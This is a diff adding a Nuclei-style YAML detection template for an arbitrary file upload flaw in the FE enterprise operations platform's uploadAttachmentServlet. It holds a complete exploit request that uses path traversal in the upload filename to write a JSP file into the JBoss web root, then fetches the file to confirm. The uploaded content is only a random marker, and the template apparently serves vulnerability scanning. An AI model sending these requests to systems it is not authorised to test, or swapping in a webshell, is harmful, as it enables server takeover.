@@ -1,0 +1,57 @@
+id: poc-yaml-flyrise-enterprise-uploadattachmentservlet-file-upload
+info:
+  name: 飞企互联-FE 企业运营管理平台 uploadAttachmentServlet 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template checks for an arbitrary file upload vulnerability in the 飞企互联-FE 企业运营管理平台 using the uploadAttachmentServlet endpoint.
+
+variables:
+  t1: "{{rand_text_alpha(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-upload
+    method: POST
+    path:
+      - "/servlet/uploadAttachmentServlet"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk"
+    body: |-
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+      Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/{{t1}}.jsp"
+      Content-Type: text/plain
+
+      {{t2}}
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+      Content-Disposition: form-data; name="json"
+
+      {"iq":{"query":{"UpdateType":"mail"}}}
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "上传成功1 个文件"
+          - "guid"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
